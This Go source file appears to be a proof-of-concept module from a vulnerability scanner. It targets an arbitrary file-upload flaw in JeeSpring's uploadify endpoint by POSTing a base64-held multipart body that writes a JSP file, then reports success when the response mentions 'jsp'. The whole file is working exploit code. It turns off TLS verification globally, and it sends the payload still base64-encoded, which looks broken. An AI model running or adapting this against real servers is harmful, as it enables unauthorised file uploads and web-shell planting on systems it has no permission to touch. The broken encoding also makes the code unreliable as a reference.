package poc

import (
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
	"strings"
	"time"
)

func JeeSpring_2023(url string) {
	headers := map[string]string{
		"User-Agent":      common.GetRandomUserAgent(),
		"Content-Type":    "multipart/form-data; boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL",
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
		"Connection":      "close",
	}

	payload := `LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo=`
	payloadBytes := []byte(payload)
	path := "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	http.DefaultTransport.(*http.Transport).TLSClientConfig.InsecureSkipVerify = true

	req, err := http.NewRequest("POST", url+path, bytes.NewBuffer(payloadBytes))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	if strings.Contains(string(body), "jsp") && resp.StatusCode == 200 {
		common.PrintVulnerabilityConfirmation("JeeSpring_2023任意文件上传漏洞", url, "Null", "7")
		common.Vulnum++
	} else {
		color.Yellow("[-] %s 未发现2023JeeSpring任意文件上传漏洞\n", url)

	}
}
